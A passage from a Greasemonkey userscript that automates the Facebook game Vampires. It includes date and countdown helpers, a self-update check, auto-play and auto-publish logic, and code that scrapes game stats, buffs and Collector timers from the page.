  evt.initMouseEvent("click", true, true, window,
                     0, 0, 0, 0, 0, false, false, false, false, 0, null);
  elt.dispatchEvent(evt);
}



/******************************** DATE/TIME ********************************/

// reads a date string from a stored GM value and converts it to seconds since 1970
function getGMTime(GMvalue) {
  var tempVal = GM_getValue(GMvalue, 0);
  var d = Date.parse(tempVal);
  return d/1000;
}

// takes a string input in the form of a countdown 'MM:SS', 'HH:MM:SS', 'MM minutes and SS seconds' and stores the
// time when the countdown is zero in a GM value.  Also takes an input of 'now' and stores the current time.
function setGMTime(GMvalue, countdownStr) {
  var d = new Date();
  d.setMilliseconds(0);

  if (countdownStr != 'now')
    d.setTime(d.getTime()+(timeLeft(countdownStr)*1000));

  GM_setValue(GMvalue, d.toString());
}

// returns the number of seconds left until a date stored in a GM value
function timeLeftGM(GMvalue) {
  var timeToCompare = getGMTime(GMvalue);

  var d = new Date();
  d.setMilliseconds(0);

  return Math.max(timeToCompare-(d.getTime()/1000), 0);
}

// takes a string input in the form of 'MM:SS', 'HH:MM:SS', or 'MM minutes and SS seconds' and returns the number of seconds it represents
function timeLeft(timeToConvert) {
  if (!timeToConvert)
    return 0;

  var returnVal = 0;

  var temp = new Array();
  temp = timeToConvert.split(':');

  if (temp.length == 2)  // MM:SS
    returnVal = ((parseInt(temp[0]) * 60) + parseInt(temp[1]));
  else if (temp.length == 3) // HH:MM:SS
    returnVal = ((parseInt(temp[0]) * 60 * 60) + (parseInt(temp[1]) * 60) + parseInt(temp[2]));
  else if (temp.length == 1) {  // 'HH hours and MM minutes and SS seconds'
    temp = timeToConvert.split(' and ');
    for (i = 0; i < temp.length; i++) {
      spaceIndex = temp[i].indexOf(' ');
      if (spaceIndex != -1) {
        firstPart = temp[i].substring(0, spaceIndex);
        secondPart = temp[i].substring(spaceIndex+1, temp[i].length);
        if ((secondPart == 'minutes') || (secondPart == 'minute'))
          returnVal = returnVal + (parseInt(firstPart) * 60);
        else if ((secondPart == 'seconds') || (secondPart == 'second'))
          returnVal = returnVal + (parseInt(firstPart));
        else if ((secondPart == 'hours') || (secondPart == 'hour'))
          returnVal = returnVal + (parseInt(firstPart * 60 * 60));
        else if ((secondPart == 'days') || (secondPart == 'day'))
          returnVal = returnVal + (parseInt(firstPart * 24 * 60 * 60));
      }
    }
  }
  return(returnVal);
}

// takes a date input and returns a string in the form of 'HH:MM' representing the time compared to now
function timeLeftHHMM(GMvalue) {

    	var now = Math.floor(new Date().getHours() * 3600 + new Date().getMinutes() * 60);

	pad = function (val, len) {
		val = String(val);
		len = len || 2;
		while (val.length < len) val = "0" + val;
		return val;
	};

	var returnHours = Math.floor((GM_getValue(GMvalue, 0)-now)/3600);
	var returnMinutes = pad(Math.floor(((GM_getValue(GMvalue, 0)-now)%3600/60)));

  return(returnHours+":"+returnMinutes);
}

// takes two string inputs in the form of 'HH:MM' and returns a boolean representing whether or not the current time is between them
function timeBetween(timeT1,timeT2) {
  if (!timeT1 || !timeT2)
    return false;

  var convertedT1 = 0;
  var convertedT2 = 0;

  var temp = new Array();
  tempT1 = timeT1.split(':');
  tempT2 = timeT2.split(':');

  if (!tempT1[0] || !tempT1[1] || !tempT2[0] || !tempT2[1])
    return false;

  convertedT1 = ((parseInt(tempT1[0]) * 3600) + parseInt(tempT1[1]) * 60);
  convertedT2 = ((parseInt(tempT2[0]) * 3600) + parseInt(tempT2[1]) * 60);

  var now = Math.floor(new Date().getHours() * 3600 + new Date().getMinutes() * 60);
//  alert('now = '+now+' T1= '+convertedT1+' T2= '+convertedT2);

  if (now>=convertedT1 && now<=convertedT2)
    return true;
  else
    return false;
}

// Convert decimal time to ?h ?m ?s format
function getDecimalTime(decimalTime) {
  var num = parseFloat(decimalTime);
  var strTime = '';
  if (num) {
    if (num >= 60) {
      strTime = parseInt(num/60) + 'h ';
      num -= parseInt(num); num *= 60;
    }
    strTime += parseInt(num) + 'm ';
    num -= parseInt(num); num *= 60;
    strTime += parseInt(num) + 's';
  }
  return strTime.replace('00','0');
}


// Function getElementsByAttribute by Robert Nyman:
// See http://robertnyman.com/2006/01/23/monday-code-giveaway-getelementsbyattribute/ for usage
/*
	Copyright Robert Nyman, http://www.robertnyman.com
	Free to use if this text is included
*/
function getElementsByAttribute(oElm, strTagName, strAttributeName, strAttributeValue){
	var arrElements = (strTagName == "*" && oElm.all)? oElm.all : oElm.getElementsByTagName(strTagName);
	var arrReturnElements = new Array();
	var oAttributeValue = (typeof strAttributeValue != "undefined")? new RegExp("(^|\\s)" + strAttributeValue + "(\\s|$)") : null;
	var oCurrent;
	var oAttribute;
	for(var i=0; i<arrElements.length; i++){
		oCurrent = arrElements[i];
		oAttribute = oCurrent.getAttribute && oCurrent.getAttribute(strAttributeName);
		if(typeof oAttribute == "string" && oAttribute.length > 0){
			if(typeof strAttributeValue == "undefined" || (oAttributeValue && oAttributeValue.test(oAttribute))){
				arrReturnElements.push(oCurrent);
			}
		}
	}
	return arrReturnElements;
}


//update the script (by Richard Gibson; changed by ms99 and blannie)
function updateScript() {
	try {
		if (!GM_getValue) return;
		GM_xmlhttpRequest({
			method: 'GET',
//			url: SCRIPT.url + '?source', // don't increase the 'installed' count; just for checking
			url: SCRIPT.metadata + '?' + Math.random(),
			onload: function(result) {
				if (result.status != 200) return;
				if (!result.responseText.match(/@version\s+([\d.]+)/)) return;
				var theOtherVersion = RegExp.$1;
				if (theOtherVersion == SCRIPT.version) {
					alert('you have the latest version' + ' (v ' + SCRIPT.version + ') !');
					return;
				} else if (theOtherVersion < SCRIPT.version) {
					alert('Beta version' + ' (v ' + SCRIPT.version + ') installed ?!');
					return;
				} else {
					if (window.confirm('New version ' + ' (v ' + theOtherVersion + ') available!\n\n' + 'Do you want to update?' + '\n')) {
						window.location.href = SCRIPT.sourceurl;
					}
				}
			}
		});
	} catch (ex) {
		addToLog('BUG DETECTED (updateScript): ' + ex);
	}
}

var dateFormat = function () {
	var	token = /d{1,4}|m{1,4}|yy(?:yy)?|([HhMsTt])\1?|[LloSZ]|"[^"]*"|'[^']*'/g,
		timezone = /\b(?:[PMCEA][SDP]T|(?:Pacific|Mountain|Central|Eastern|Atlantic) (?:Standard|Daylight|Prevailing) Time|(?:GMT|UTC)(?:[-+]\d{4})?)\b/g,
		timezoneClip = /[^-+\dA-Z]/g,
		pad = function (val, len) {
			val = String(val);
			len = len || 2;
			while (val.length < len) val = "0" + val;
			return val;
		};

	// Regexes and supporting functions are cached through closure
	return function (date, mask, utc) {
		var dF = dateFormat;

		// You can't provide utc if you skip other args (use the "UTC:" mask prefix)
		if (arguments.length == 1 && Object.prototype.toString.call(date) == "[object String]" && !/\d/.test(date)) {
			mask = date;
			date = undefined;
		}

		// Passing date through Date applies Date.parse, if necessary
		date = date ? new Date(date) : new Date;
		if (isNaN(date)) throw SyntaxError("invalid date");

		mask = String(dF.masks[mask] || mask || dF.masks["default"]);

		// Allow setting the utc argument via the mask
		if (mask.slice(0, 4) == "UTC:") {
			mask = mask.slice(4);
			utc = true;
		}

		var	_ = utc ? "getUTC" : "get",
			d = date[_ + "Date"](),
			D = date[_ + "Day"](),
			m = date[_ + "Month"](),
			y = date[_ + "FullYear"](),
			H = date[_ + "Hours"](),
			M = date[_ + "Minutes"](),
			s = date[_ + "Seconds"](),
			L = date[_ + "Milliseconds"](),
			o = utc ? 0 : date.getTimezoneOffset(),
			flags = {
				d:    d,
				dd:   pad(d),
				ddd:  dF.i18n.dayNames[D],
				dddd: dF.i18n.dayNames[D + 7],
				m:    m + 1,
				mm:   pad(m + 1),
				mmm:  dF.i18n.monthNames[m],
				mmmm: dF.i18n.monthNames[m + 12],
				yy:   String(y).slice(2),
				yyyy: y,
				h:    H % 12 || 12,
				hh:   pad(H % 12 || 12),
				H:    H,
				HH:   pad(H),
				M:    M,
				MM:   pad(M),
				s:    s,
				ss:   pad(s),
				l:    pad(L, 3),
				L:    pad(L > 99 ? Math.round(L / 10) : L),
				t:    H < 12 ? "a"  : "p",
				tt:   H < 12 ? "am" : "pm",
				T:    H < 12 ? "A"  : "P",
				TT:   H < 12 ? "AM" : "PM",
				Z:    utc ? "UTC" : (String(date).match(timezone) || [""]).pop().replace(timezoneClip, ""),
				o:    (o > 0 ? "-" : "+") + pad(Math.floor(Math.abs(o) / 60) * 100 + Math.abs(o) % 60, 4),
				S:    ["th", "st", "nd", "rd"][d % 10 > 3 ? 0 : (d % 100 - d % 10 != 10) * d % 10]
			};

		return mask.replace(token, function ($0) {
			return $0 in flags ? flags[$0] : $0.slice(1, $0.length - 1);
		});
	};
}();

// Some common format strings
dateFormat.masks = {
	"default":      "ddd mmm dd yyyy HH:MM:ss",
	shortDate:      "m/d/yy",
	mediumDate:     "mmm d, yyyy",
	longDate:       "mmmm d, yyyy",
	fullDate:       "dddd, mmmm d, yyyy",
	shortTime:      "h:MM TT",
	mediumTime:     "h:MM:ss TT",
	longTime:       "h:MM:ss TT Z",
	isoDate:        "yyyy-mm-dd",
	isoTime:        "HH:MM:ss",
	isoDateTime:    "yyyy-mm-dd'T'HH:MM:ss",
	isoUtcDateTime: "UTC:yyyy-mm-dd'T'HH:MM:ss'Z'"
};

// Internationalization strings
dateFormat.i18n = {
	dayNames: [
		"Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat",
		"Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"
	],
	monthNames: [
		"Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec",
		"January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"
	]
};

// For convenience...
Date.prototype.format = function (mask, utc) {
	return dateFormat(this, mask, utc);
};


/****************************************************************/

//add popup listener
var modificationTimer;
//document.addEventListener('DOMSubtreeModified', function(e){ setTimeout(function(){ handleDOMSubtreeModified(e); }, 0);}, false);
//document.addEventListener('DOMNodeInserted', function(e){setTimeout(function(){ nodeInserted(e); }, 0);}, false);


var innerPageElt;               // The currently visible inner page
var contentRowElt;              // The currently visible content page
var clickAction;                // Action being attempted with click simulation


// Borrowed from MWAP:
if (!checkInPublishPopup() && !checkLoadIframe()  &&
    (/vampiresgame/.test(document.referrer.match) ||
     /facebook6.vampires.zynga.com/.test(window.location.href))) {

	// Borrowed from MWAP:
	// This line is optional, but it makes the menu display faster.
	refreshVWAPCSS();
	customizeMasthead();
	customizeLayout();


	var Autoplay = new Animate();
	Autoplay.desc = 'auto-play';
	Autoplay.fx = loadHome;


	// Add event listeners.
	setListenContent(true);
	resetModificationTimer();
}

// Borrowed from MWAP:
// Define AutoStat allocation mode
const AUTOSTAT_TARGET        = 0;
const AUTOSTAT_RATIO_LEVEL   = 1;
const AUTOSTAT_RATIO_ATTACK  = 2;
const AUTOSTAT_RATIO_DEFENSE = 3;
const AUTOSTAT_RATIO_HEALTH  = 4;
const AUTOSTAT_RATIO_ENERGY  = 5;
const AUTOSTAT_RATIO_RAGE    = 6;

// Borrowed from MWAP:
// Auto Stat mode arrays
var autoStatDescrips  = ['Level', 'Energy', 'Rage', 'Attack', 'Defense', 'Health'];
var autoStatModes     = ['autoStatEnergyMode', 'autoStatRageMode', 'autoStatAttackMode', 'autoStatDefenseMode', 'autoStatHealthMode'];
var autoStatPrios     = ['autoStatEnergyPrio', 'autoStatRagePrio', 'autoStatAttackPrio', 'autoStatDefensePrio', 'autoStatHealthPrio'];
var autoStatFallbacks = ['autoStatEnergyFallback', 'autoStatRageFallback', 'autoStatAttackFallback', 'autoStatDefenseFallback', 'autoStatHealthFallback'];
var autoStatBases     = ['autoStatEnergyBase', 'autoStatRageBase', 'autoStatAttackBase', 'autoStatDefenseBase', 'autoStatHealthBase'];
var autoStatRatios    = ['autoStatEnergyRatio', 'autoStatRageRatio', 'autoStatAttackRatio', 'autoStatDefenseRatio', 'autoStatHealthRatio'];

// Stat Ordinal constants
const ENERGY_STAT  = 0;
const RAGE_STAT    = 1;
const ATTACK_STAT  = 2;
const DEFENSE_STAT = 3;
const HEALTH_STAT  = 4;




// Turns on/off the high-level event listener for the game.
function setListenContent(on) {
//	var elt = document.getElementById('app_content_25287267406');
	var elt = document.getElementById('mainDiv');
	if (!elt)
    return;
	
	if (on) {
		elt.addEventListener('DOMSubtreeModified', handleDOMSubtreeModified, false);
    log('Content Event Listener Added!');

	} else {
		elt.removeEventListener('DOMSubtreeModified', handleDOMSubtreeModified, false);
    log('Content Event Listener Removed!');
    
	}
}
function resetModificationTimer() {
	if (modificationTimer)
		window.clearTimeout(modificationTimer);
	
	modificationTimer = window.setTimeout(handleModificationTimer, 500);
}

function handleModificationTimer() {
	// The timer has gone off, so assume that page updates have finished.
	log('Changes finished.');

	// Find the visible inner page.
	var pageChanged = false;
	var justPlay = false;
	var prevPageElt = innerPageElt;
	contentRowElt = document.getElementById('vamp_content');
	innerPageElt = xpathFirst('.//div[@id="content"]', contentRowElt);

	if (!innerPageElt) return;

	// Determine if the displayed page has changed.
	if (!xpathFirst('.//div[@id="content"]', innerPageElt)) {
	  pageChanged = true;
	} else if (prevPageElt != innerPageElt) {
	  //addToLog('Switched inner page to: ' + innerPageElt.id);
	  pageChanged = true;
	}
	
	RefreshGlobalStats();	
	LogEvents();





//	doHighPriority();
//
//	if(GM_getValue('paused') == 0)
//	{
//		doQuickClicks();
//	}
//	
//	// Kick off auto-play.
//	if(!handlePages())
//		doAutoPlay();  




	if(doHighPriority()) {

		if(GM_getValue('paused') == 0)
		{
			doQuickClicks();
		}

		// Kick off auto-play.
		if(!handlePages())
			doAutoPlay();  
	}




}

function handleDOMSubtreeModified(e) {
  //consoleLogElement(e.target, 'subtree: ');
  var parentElt = e.target.parentNode;
  
  if (!parentElt)
    return;

  // Exclude changes related to countdowns and logging.
  if (ignoreElement(e.target))
    return;
  
  resetModificationTimer();
}

function handlePublishing() {
  fetchPubOptions();
  if (GM_getValue('paused')==0) {
    try {

      // Publishing/skipping posts
//      var skipElt = xpathFirst('.//input[@name="cancel"]');
//      var pubElt = xpathFirst('.//input[@name="publish"]');
//      var okElt = xpathFirst('.//input[@name="okay"]');

      var skipElt = xpathFirst('//input[@type="submit" and @name="cancel"]');
      var pubElt = xpathFirst('//input[@type="submit" and @name="publish"]');
      var okElt = xpathFirst('//input[@type="submit" and @name="error_ok"]');


//if(skipElt) alert('found skipElt');
//if(pubElt) alert('found pubElt');
//if(okElt) alert('found okElt');

      // If OK button is found, close the window by pressing it
      if (okElt) {
//        alert('Found OK button - clicking it');
        log('Publish: Clicked OK Button');
        clickElement(okElt);

      // If (1) Pub button is not found anymore; or
      //    (2) It's been 10 seconds since the post window loaded
      // Then close the window
      } else if (!pubElt || !timeLeftGM('postTimer')) {
//        alert('Cannot find Publish button OR it has been 10 seconds since post window loaded - clicking Skip');
        log('Publish: Cannot find Publish button OR it has been 10 seconds since post window loaded - clicking Skip');
        clickElement(skipElt);

        if (skipElt) {
          log('Publish: Clicked Skip');
          clickElement(skipElt);
        }
        else log('Publish: Found no skip button');


      }

      // Perform publishing logic once posting buttons have loaded
      if (skipElt && pubElt) {
        // Generic publishing function
        var checkPublish = function (xpathString, gmFlag, pubElt, skipElt, logMessage) {
          var eltDiv = xpathFirst(xpathString);
          if (eltDiv) {
            if (isGMChecked(gmFlag)) {
              log('Publish: Publish for this topic is selected - clicking publish');
//              alert('Publish is selected - clicking publish');
//              addToLog('PUBLISH: Publishing '+logMessage);
              clickElement(pubElt);
            }
            else {
              log('Publish: Publish for this topic is NOT selected - clicking skip');
//              alert('Publish is NOT selected - clicking skip');
//              addToLog('PUBLISH: Skipping '+logMessage);
              clickElement(skipElt);
            }

            // Wait for .9 seconds before trying to close window manually
            window.setTimeout(handlePublishing, 900);
            return true;
          }
          return false;
        };

        // publish Mandy Spins (Blood Magic):
        if (checkPublish('.//div[contains(., "has spun Mandy\'s Wheel")]','autoPublishBloodMagic', pubElt, skipElt, 'Blood Magic spin')) return;

        // publish Mission Assistance Request:
        if (checkPublish('.//div[contains(., "is sharing Blood and Experience for friends who are able to assist")]','autoPublishMissionAssistance', pubElt, skipElt, 'Mission Assistance request')) return;

        // publish Kills:
        if (checkPublish('.//div[contains(., "Celebrating their victory,")]','autoPublishFightKill', pubElt, skipElt, 'Kill')) return;

        // publish Promo Minions:
        if (checkPublish('.//div[contains(., " has found a lonely")]','autoPublishPromoMinion', pubElt, skipElt, 'Promo Minion')) return;

        // publish Level Up:
        if (checkPublish('.//div[contains(., " has just reached level ")]','autoPublishLevelUp', pubElt, skipElt, 'Level Up')) return;

        // publish Collector Mystery Box:
        if (checkPublish('.//div[contains(., "  has made a deal with The Collector ")]','autoPublishCollectorBox', pubElt, skipElt, 'Collector Mystery Box')) return;

        // publish Ancient Chests:
        if (checkPublish('.//div[contains(., "uncovered an Ancient Vampiric Chest")]','autoPublishAncientChests', pubElt, skipElt)) {
        	addToLog('Published Ancient Chest.');
        	return;
        }




// Examples from MWAP
//        // Gift post
//        if (checkPublish('.//div[contains(., "sent")]/a[contains(@href, "sendgiftshort")]','autoGiftSkipOpt', skipElt, pubElt)) return;
//
//        // Daily chance
//        if (checkPublish('.//div[contains(., "prizes are given away each week")]','autoLottoOpt', skipElt, pubElt)) return;
//
//        // Secret Stash
//        if (checkPublish('.//div[contains(.,"secret stash")]','autoSecretStash', pubElt, skipElt)) return;
//
//        // Iced Opponent
//        if (checkPublish('.//div[contains(.,"just iced")]','autoIcePublish', pubElt, skipElt)) return;
//
//        // Level up bonus
//        if (checkPublish('.//div[contains(.,"promoted")]','autoLevelPublish', pubElt, skipElt)) return;
//
//        // Achievement bonus
//        if (checkPublish('.//div[contains(.,"earned the")]','autoAchievementPublish', pubElt, skipElt)) return;
//
//        // Job Help
//        if (checkPublish('.//div[contains(.,"requested help")]','autoAskJobHelp', pubElt, skipElt)) return;
//
//        // Share wishlist
//        if (checkPublish('.//div[contains(.,"is looking for")]','autoShareWishlist', pubElt, skipElt)) return;
//
//        // War Reward
//        if (checkPublish('.//div[contains(.,"rewarded their friends with")]','autoWarRewardPublish', pubElt, skipElt)) return;
//
//        // War back up request
//        if (checkPublish('.//div[contains(.,"needs help to win their War")]','autoWarResponsePublish', pubElt, skipElt)) return;
//
//        // War rally for help
//        if (checkPublish('.//div[contains(.,"sided with")]','autoWarRallyPublish', pubElt, skipElt)) return;
//
//        // War Declaration
//        if (checkPublish('.//div[contains(.,"and has Declared War")]','autoWarPublish', pubElt, skipElt)) return;
      }
    } catch (ex) {
      // Ignore exceptions
      log('Publishing error: ' + ex);
    }
  }

  // Retry until window is closed
  window.setTimeout(handlePublishing, 900);
}









// reload logic
if((GM_getValue('autoClick', '') == "checked")&& (GM_getValue('paused')==0))
{
// Modification of Automatic Periodic Judging to allow for configurable parameters in the settings screens
	if(GM_getValue('autoPeriodicJudge', '') == "checked") {
// Go to the Judging page periodically, based on timer variable
// Periodic, Automatic Judging of Random People
		JudgeTimerIndex = parseInt(GM_getValue('judgeTimerIndex', '0')) + 1;
		if(JudgeTimerIndex>=parseInt(GM_getValue('autoJudgeTimerIndexMax', '0'))){
			GM_setValue('judgeTimerIndex',0);
			GM_setValue('JudgeCount',GM_getValue('autoJudgeCount','0'));
			window.location = "http://apps.facebook.com/"+SCRIPT.name+"/judge.php";
		} else {
			GM_setValue('judgeTimerIndex',JudgeTimerIndex);
		}
	}

    var timeWait = Math.floor(parseFloat(GM_getValue('r1', '6')) + parseFloat((GM_getValue('r2', '11'))-parseFloat(GM_getValue('r1', '6')))*Math.random())*1000;
      setTimeout("document.location = '"+"http://apps.facebook.com/"+SCRIPT.name+ GM_getValue('refreshPage', "/index.php")+"'", timeWait);
}

// page not loaded correctly... just retrun
if(document.getElementById('stats_table') == null)
	return;

function log(message)
{
	if(debug)
		GM_log(message);
//		GM_log(message + ' [Time='+new Date().getTime()+']');
}
	
function RefreshGlobalStats() {

	log('refreshGlobalStats.');

	try{
//		alert('body.innerHTML='+document.body.innerHTML);
		gameVersion = parseInt(document.getElementById('banner_row').innerHTML.split('facebook6.vampires.static.zynga.com/')[1].split('/graphics')[0]);
		if(!gameVersion){
			gameVersion = "";
		}
		level =  parseInt(document.body.innerHTML.split('Level:')[1]);
		clan =  parseInt(document.body.innerHTML.split('my clan (')[1]);
		td = document.getElementById('stats_table').getElementsByTagName('td');
		blood = document.getElementById('current_cash').innerHTML.toInt();
		health = parseInt(document.getElementById('current_health').innerHTML.toInt());
		energy = document.getElementById('current_energy').innerHTML.toInt();
		maxenergy = document.getElementById('current_energy').parentNode.innerHTML.split('</span>/')[1].toInt();
		rage =parseInt(document.getElementById('current_stamina').innerHTML.toInt());
		maxrage =parseInt(document.getElementById('current_stamina').parentNode.innerHTML.split("</span>/")[1].toInt());
		bankpopup = document.getElementById('bank_popup');
		bank = bankpopup.getElementsByTagName('span')[0].innerHTML;
		bankvalue = bank.split('blood.gif">')[1].split(',').join('').toInt();
		if(bank!=undefined){
			var bankStat = makeElement('div', document.body);
			bankStat.setAttribute("style", "position: absolute; left: "+(statsLeft+92)+"px; top: "+(statsTop+163)+"px; font-family: Arial; font-size: 12px; font-weight: 400; -moz-user-select: none; -khtml-user-select: none; cursor: pointer; color: white;");
			bankStat.innerHTML = 'Bank: '+bank;
		}

// Get the Current Exp, Exp for next level:
		var ExpBlock = document.getElementById('levelupwords').innerHTML.split('title="Click here to view your stats!" class="noUnderline">')[1].split('</a>')[0];
		if (ExpBlock!=null) {
			var curExp = ExpBlock.split('/')[0].toInt();
			var lvlExp = ExpBlock.split('/')[1].toInt();
			ExpToNextLevel = lvlExp - curExp;
		} else {
			ExpToNextLevel = 0;
		}

//Create Exp to lvl
	 	var ExpToLvlStat = document.evaluate("//div[@class='ExpToLvl']", document,null,9,null).singleNodeValue;
	 	if (energy==0)
		 	var ratio = '&#8734;';
		else
		 	var ratio = Math.floor((ExpToNextLevel / energy)*100)/100;
		if(!ExpToLvlStat)
		{
			var ExpToLvlStat = makeElement('div', document.body);
			ExpToLvlStat.setAttribute("class", "ExpToLvl");
//			ExpToLvlStat.setAttribute("style", "position: absolute; left: "+(statsLeft+160)+"px; top: "+(statsTop+18)+"px; font-family: Times,serif; font-size: 12px; font-weight: 400; -moz-user-select: none; -khtml-user-select: none; cursor: pointer; color: white;");
			ExpToLvlStat.setAttribute("style", "position: absolute; left: "+(expLeft+80)+"px; top: "+(expTop-35)+"px; font-family: Times,serif; font-size: 12px; font-weight: 400; -moz-user-select: none; -khtml-user-select: none; cursor: pointer; color: white;");
		}
		ExpToLvlStat.innerHTML = '(-'+ExpToNextLevel+')';
		if (isGMChecked('showExpNrgRatio')) ExpToLvlStat.innerHTML += '<br>exp/nrg:'+ratio;


// Grab and save my current number of clan and Skill Rating 
		if(isGMUndefined('myClan')) {
			log('Clan Size Unknown');
			if (GM_getValue('paused')==0 && location.href.indexOf('/recruit') == -1) {
				GM_setValue('myClan',0);
				log('Going to Clan screen to get Clan Size');
				window.location = "http://apps.facebook.com/"+SCRIPT.name+"/recruit.php";
				return;
			}
		}
		if(isGMUndefined('mySkillRanking')) {
			log('Skill Ranking Unknown');
			if (GM_getValue('paused')==0 && location.href.indexOf('/stats') == -1 && location.href.indexOf('/recruit') == -1) {
				GM_setValue('mySkillRanking',0);
				log('Going to Stats screen to get Skill Ranking');
				window.location = "http://apps.facebook.com/"+SCRIPT.name+"/stats.php";
				return;
			}
		}

// Automate Special Events
// If needed, get the number of Event Resource Items
		if(eventActive && eventHasResource) {
			eventNumResources = parseInt(document.getElementById('event_boe').innerHTML.split(';">')[1].split('</a>')[0].toInt());
			//alert('eventNumResources:'+eventNumResources);
		}
		
	}
	catch (e){ GM_log(e);}

	if (location.href.indexOf('buffs.php') != -1) {
		try{
			var activeMagicItems  = document.evaluate("//div[@id='content']//table//tr",document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null);//.singleNodeValue;
			var now = Math.floor(new Date().getHours() * 3600 + new Date().getMinutes() * 60 + new Date().getSeconds());
			
			GM_setValue('activeMagicGGon', false);
			GM_setValue('activeMagicGGStrength', '0%');
			GM_setValue('activeMagicGGExpireTime', 0);
			GM_setValue('activeMagicBLon', false);
			GM_setValue('activeMagicBLStrength', '0%');
			GM_setValue('activeMagicBLExpireTime', 0);
			GM_setValue('activeMagicWGon', false);
			GM_setValue('activeMagicWGStrength', '0%');
			GM_setValue('activeMagicWGExpireTime', 0);
			GM_setValue('activeMagicDSon', false);
			GM_setValue('activeMagicDSStrength', '+0');
			GM_setValue('activeMagicDSExpireTime', 0);
			GM_setValue('activeMagicLKon', false);
			GM_setValue('activeMagicLKStrength', '0%');
			GM_setValue('activeMagicLKExpireTime', 0);
			GM_setValue('activeMagicGWon', false);
			GM_setValue('activeMagicGWStrength', '0%');
			GM_setValue('activeMagicGWExpireTime', 0);
			GM_setValue('activeMagicWCon', false);
			GM_setValue('activeMagicWCStrength', '0');
			GM_setValue('activeMagicWCExpireTime', 0);
			
			for (i = 0; i < activeMagicItems.snapshotLength; i++)
			{
//				var activeMagicName = activeMagicItems.snapshotItem(i).innerHTML.split('<td>')[2].split('<b>')[1].split('</b>')[0];
//				var activeMagicName = activeMagicItems.snapshotItem(i).innerHTML.split('<td>')[2].split('<b><span class="good">')[1].split('</span></b>')[0];
				var activeMagicName = activeMagicItems.snapshotItem(i).innerHTML.split('<td>')[2].split('<b><span class="')[1].split('">')[1].split('</span></b>')[0];
				//alert('activeMagicName='+activeMagicName);
				if (activeMagicName=="Warlock's Gift")
					var activeMagicStrength = activeMagicItems.snapshotItem(i).innerHTML.split('<td>')[2].split('refill ')[1].split(' ')[0];
				else 
					var activeMagicStrength = activeMagicItems.snapshotItem(i).innerHTML.split('<td>')[2].split('</b> ')[1].split(' ')[0];
				//alert(activeMagicName+' Strength='+activeMagicStrength);
				var activeMagicExpireHours = activeMagicItems.snapshotItem(i).innerHTML.split('<td>')[2].split('Expires in ')[1].split(' hour')[0].toInt();
				var activeMagicExpireMinutes = activeMagicItems.snapshotItem(i).innerHTML.split('<td>')[2].split(' hour')[1].split(' and ')[1].split(' minute')[0].toInt();
				var activeMagicExpireTime = now+(activeMagicExpireHours*3600) + (activeMagicExpireMinutes*60);
				//alert(activeMagicName+' Expires at '+activeMagicExpireTime);


				switch(activeMagicName) {
					case "Glyph of Guile":
						GM_setValue('activeMagicGGon', true);
						GM_setValue('activeMagicGGStrength', activeMagicStrength.split('+')[1]);
						GM_setValue('activeMagicGGExpireTime', activeMagicExpireTime);
						break;
					case "Bloodlust":
						GM_setValue('activeMagicBLon', true);
						GM_setValue('activeMagicBLStrength', activeMagicStrength.split('+')[1]);
						GM_setValue('activeMagicBLExpireTime', activeMagicExpireTime);
						break;
					case "Warlock's Gift":
						GM_setValue('activeMagicWGon', true);
						GM_setValue('activeMagicWGStrength', activeMagicStrength);
						GM_setValue('activeMagicWGExpireTime', activeMagicExpireTime);
						break;
					case "Demonic Strength":
						GM_setValue('activeMagicDSon', true);
						GM_setValue('activeMagicDSStrength', activeMagicStrength);
						GM_setValue('activeMagicDSExpireTime', activeMagicExpireTime);
						break;
					case "Lilith's Kiss":
						GM_setValue('activeMagicLKon', true);
						GM_setValue('activeMagicLKStrength', activeMagicStrength.split('+')[1]);
						GM_setValue('activeMagicLKExpireTime', activeMagicExpireTime);
						break;
					case "Glyph of Wisdom":
						GM_setValue('activeMagicGWon', true);
						GM_setValue('activeMagicGWStrength', activeMagicStrength.split('+')[1]);
						GM_setValue('activeMagicGWExpireTime', activeMagicExpireTime);
						break;
					case "Witch's Curse":
						GM_setValue('activeMagicWCon', true);
						GM_setValue('activeMagicWCStrength', activeMagicStrength);
						GM_setValue('activeMagicWCExpireTime', activeMagicExpireTime);
				}
			}
			setGMTime('activeMagicTimer', activeMagicRefreshInterval);
			refreshActiveMagicBox();
		}
		catch (e){ GM_log(e);}
	}

	if (location.href.indexOf('index.php') != -1 || location.href.indexOf('index2.php') != -1) {

		setGMTime('goToIndexTimer', goToIndexInterval);

		// Gather information about the Collector
		// Collector States:
		// 1: Available for Hire
		// 2: Hired
		// 3: Ready to collect
		// 4: Available for re-hire (too late)
		// -1: State Unknown
		try{
			var collectorDiv = document.evaluate("//div[@class='hm_collector']",document,null,9,null).singleNodeValue;
			var goToCollectorLink = xpathFirst('//a[contains(@href,"/collector.php")]', collectorDiv);
			var collectorHireElt = xpathFirst('//input[@type="submit" and @value="Hire Collector"]', collectorDiv);
			var collectorRehireElt = xpathFirst('//input[@type="submit" and @value="Rehire Collector"]', collectorDiv);
			var collectorRehireBribeElt = xpathFirst('//input[@type="submit" and @value="Bribe for 3 Favor Points"]', collectorDiv);
			var collectorBribeElt = xpathFirst('//input[@type="submit" and @value="Collect Early for 6 Favor Points"]', collectorDiv);
			var collectorTimerElt = xpathFirst('//span[@id="myFreakinTimer"]', collectorDiv);

			if(collectorHireElt) {
				GM_setValue('collectorState', 1);
				//addToLog('Collector is available for Hire');
				var now = Math.floor(new Date().getTime() / 1000);
				if (GM_getValue('autoCollector', '') == "checked")
					GM_setValue('CollectorDue',now);
				else
					GM_setValue('CollectorDue',now + (24 * 3600));
			} else if (collectorTimerElt) {
				if (collectorTimerElt.innerHTML.indexOf('00:00:00') != -1) {
					GM_setValue('collectorState', 3);
					addToLog('Collector is ready to collect');
					var now = Math.floor(new Date().getTime() / 1000);
					GM_setValue('CollectorDue',now);
				} else {
					GM_setValue('collectorState', 2);
					//addToLog('Collector is busy crafting - time to collect: '+collectorTimerElt.innerHTML);
					collectorDue = (collectorTimerElt.innerHTML.split(':')[0] * 3600) + (collectorTimerElt.innerHTML.split(':')[1].split(':')[0] * 60) + (collectorTimerElt.innerHTML.split(':')[2]*1);
					var now = Math.floor(new Date().getTime() / 1000);
					GM_setValue('CollectorDue',now + collectorDue);
					//alert('collectorDue='+collectorDue);
